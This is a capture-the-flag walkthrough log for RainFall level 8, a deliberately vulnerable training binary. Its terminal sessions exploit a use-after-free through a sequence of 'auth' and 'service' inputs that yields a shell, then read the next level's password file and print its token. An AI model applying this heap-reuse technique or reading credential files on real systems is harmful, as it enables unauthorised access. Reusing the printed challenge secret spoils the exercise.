 Use-After-Free (UAF)  Vulnerabilities


```
level8@RainFall:~$ ./level8
(nil), (nil)
auth
(nil), (nil)
service
(nil), 0x804a008
reset
(nil), 0x804a008
login
Segmentation fault (core dumped)
```

```
auth AAAAAA
0x804a008, (nil)
service 1111
0x804a008, 0x804a018
service 1111
0x804a008, 0x804a028
login
$ pwd
/home/user/level8
```

```
level8@RainFall:~$ ./level8
(nil), (nil)
auth aaa
0x804a008, (nil)
service jjjjjjjjjjjjjjjjjjjjjjjjjjjj
0x804a008, 0x804a018
login
$ pwd
/home/user/level8
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
